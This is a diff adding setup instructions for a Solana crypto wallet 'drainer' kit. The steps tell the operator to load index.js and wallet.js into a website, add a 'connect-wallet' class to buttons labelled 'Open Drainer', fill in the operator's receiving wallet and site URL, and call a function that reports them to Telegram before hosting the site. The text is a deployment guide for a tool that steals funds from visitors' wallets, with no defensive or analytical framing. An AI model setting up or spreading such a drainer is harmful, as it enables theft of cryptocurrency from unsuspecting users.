@@ -1,0 +1,32 @@
+
+#######STEP 1
+
+
+Please download and attach the index.js and wallet.js file into your website source code and attach the following to your HTML head:
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<script src="/index.js"></script>
+
+
+
+
+#######STEP 2
+
+
+
+You can then add the drainer to elements of your website by adding class name "connect-wallet" to any btn, for example:
+
+
+<button class="connect-wallet">Open Drainer</button>
+
+
+
+#######STEP 3
+
+Add your Wallet Adresses & Website in the wallet.js files
+
+const solana_wallet_receiver_id = 'YOUR_SOLANA_WALLET_RECEIVER_ID'; const website_url = 'YOUR_WEBSITE_URL'; sendMessageToTelegram(solana_wallet_receiver_id, website_url);
+
+All is setup your drainer is ready to go. Upload your website on Vercel or any Hosting
+
+
+#######All done !!!!!!!!!#######
